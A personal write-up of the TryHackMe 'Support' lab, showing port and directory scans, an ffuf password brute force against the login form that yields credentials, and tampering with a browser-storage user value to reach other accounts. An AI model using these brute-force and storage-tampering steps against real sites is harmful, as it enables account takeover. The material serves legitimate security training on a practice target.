---
description: Just my notes on this machine
---

# TryHackMe: Support

Recon

┌──(root㉿kali)-\[\~/Desktop]\
└─# rustscan -a 10.66.144.133

.----. .-. .-. .----..---. .----. .---. .--. .-. .-.\
\| {} }| { } |{ {\_\_ {\_ _}{ {_\_ / \_\_\_} / {} \ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |` -' `-'`-----'`----'` -' `----'` ---' `-'` -'`-'` -'\
The Modern Day Port Scanner.

***

: [https://github.com/RustScan/RustScan](https://github.com/RustScan/RustScan) :

TreadStone was here 🚀

\[\~] The config file is expected to be at "/root/.rustscan.toml"\
\[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers\
\[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.\
Open 10.66.144.133:22\
Open 10.66.144.133:80\
\[\~] Starting Script(s)\
\[\~] Starting Nmap 7.99 ([https://nmap.org](https://nmap.org) ) at 2026-07-08 13:01 -0400\
Initiating Ping Scan at 13:01\
Scanning 10.66.144.133 \[4 ports]\
Completed Ping Scan at 13:01, 0.06s elapsed (1 total hosts)\
Initiating Parallel DNS resolution of 1 host. at 13:01\
Completed Parallel DNS resolution of 1 host. at 13:01, 0.50s elapsed\
DNS resolution of 1 IPs took 0.50s. Mode: Async \[#: 4, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\
Initiating SYN Stealth Scan at 13:01\
Scanning 10.66.144.133 \[2 ports]\
Discovered open port 22/tcp on 10.66.144.133\
Discovered open port 80/tcp on 10.66.144.133\
Completed SYN Stealth Scan at 13:01, 0.07s elapsed (2 total ports)\
Nmap scan report for 10.66.144.133\
Host is up, received reset ttl 62 (0.053s latency).\
Scanned at 2026-07-08 13:01:37 EDT for 0s

PORT STATE SERVICE REASON\
22/tcp open ssh syn-ack ttl 62\
80/tcp open http syn-ack ttl 62

Read data files from: /usr/share/nmap\
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds\
Raw packets sent: 6 (240B) | Rcvd: 3 (128B)

┌──(root㉿kali)-\[\~/Desktop]

We can see that ports 22 and 80 are open, I think it is best to ignore SSH unless we know what the usernames are for now.

We can run a Directory buster scan

┌──(root㉿kali)-\[\~/Desktop]\
└─# dirb [http://10.66.144.133/](http://10.66.144.133/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

***

### DIRB v2.22

By The Dark Raver

START\_TIME: Wed Jul 8 13:09:19 2026\
URL\_BASE: [http://10.66.144.133/](http://10.66.144.133/)\
WORDLIST\_FILES: /usr/share/dirb/wordlists/common.txt\
OPTION: Not Stopping on warning messages

***

GENERATED WORDS: 4612

* \--- Scanning URL: [http://10.66.144.133/](http://10.66.144.133/) ----\
  \==> DIRECTORY: [http://10.66.144.133/includes/](http://10.66.144.133/includes/)
* [http://10.66.144.133/index.php](http://10.66.144.133/index.php) (CODE:200|SIZE:2591)
* [http://10.66.144.133/info.php](http://10.66.144.133/info.php) (CODE:200|SIZE:73372)\
  \==> DIRECTORY: [http://10.66.144.133/js/](http://10.66.144.133/js/)\
  \==> DIRECTORY: [http://10.66.144.133/layout/](http://10.66.144.133/layout/)
* [http://10.66.144.133/server-status](http://10.66.144.133/server-status) (CODE:403|SIZE:278)\
  \==> DIRECTORY: [http://10.66.144.133/skins/](http://10.66.144.133/skins/)
* \--- Entering directory: [http://10.66.144.133/includes/](http://10.66.144.133/includes/) ----\
  (!) WARNING: Directory IS LISTABLE. No need to scan it.

(Use mode '-w' if you want to scan it anyway)\
^C> Testing: [http://10.66.144.133/includes/advertising](http://10.66.144.133/includes/advertising)

it finds two directories that stand out: index.php and info.php, index.php leads us no where.

[http://10.66.144.133/index.php](http://10.66.144.133/index.php)

![image.png](attachment:bf2e97e8-1e96-47d0-9883-f47fbbcc580d:image.png)

<figure><img src="https://app.notion.com/p/TryHackMe-Support-397fe83a084880e0b1a7d62900b03a04?source=copy_link#397fe83a084880b09f14d76f6b7dae83" alt=""><figcaption></figcaption></figure>

However when we go over to Index.php we get a lot of information:

![image.png](attachment:bdffe1e4-7f2a-4a84-a5bf-e96262ba4645:image.png)

Using FUFF we can use the email that was shown to us and Fuzz a password:

┌──(root㉿kali)-\[/usr/share/wordlists]\
└─# ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d "email=help@support.thm\&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u[http://10.66.144.133](http://10.66.144.133) -fs 2678

```
    /'___\\  /'___\\           /'___\\
   /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
   \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
    \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
     \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
      \\/_/    \\/_/   \\/___/    \\/_/

   v2.1.0-dev
```

***

:: Method : POST\
:: URL :[http://10.66.144.133](http://10.66.144.133)\
:: Wordlist : FUZZ: /usr/share/wordlists/rockyou.txt\
:: Header : Content-Type: application/x-www-form-urlencoded\
:: Data : email=help@support.thm\&password=FUZZ\
:: Follow redirects : false\
:: Calibration : false\
:: Timeout : 10\
:: Threads : 40\
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\
:: Filter : Response size: 2678

***

snoopy \[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 51ms]\
:: Progress: \[79017/14344392] :: Job \[1/1] :: 754 req/sec :: Duration: \[0:01:45] :: Errors: 0 ::^Z\
zsh: suspended ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d -H -u -fs 2678

┌──(root㉿kali)-\[/usr/share/wordlists]\
└─#

help@support.thm:snoopy

we got in!

exploring the website, we can look at the Storage section of the developer tab:

![image.png](attachment:b5c9b45a-991c-499e-ad6b-8abe558208f3:image.png)

it gives a user and a hash value

isITUser: 68934a3e9455fa72420237eb05902327

![image.png](attachment:56ed0b1b-3375-4fa7-8ea4-dccabe59609e:image.png)

We can take this over to Cyberchef

![image.png](attachment:e436b064-6782-4030-8383-ea5a1f837682:image.png)

you take the value you get, and put it in where that user is in the Storage area, refresh the page and you get a new page!

![image.png](attachment:f3f14da4-700a-4f73-bd04-413931344ec4:image.png)

![image.png](attachment:37890a86-0e93-41a6-bc51-d724faa53bc7:image.png)

you can also look for other users too.

![image.png](attachment:01ce941d-e0a7-46c0-b94e-65de86e0bfd4:image.png)

‘support110’

it works!

specialadmin@support.thm:support@110



Reminder for me: Fix the Images.
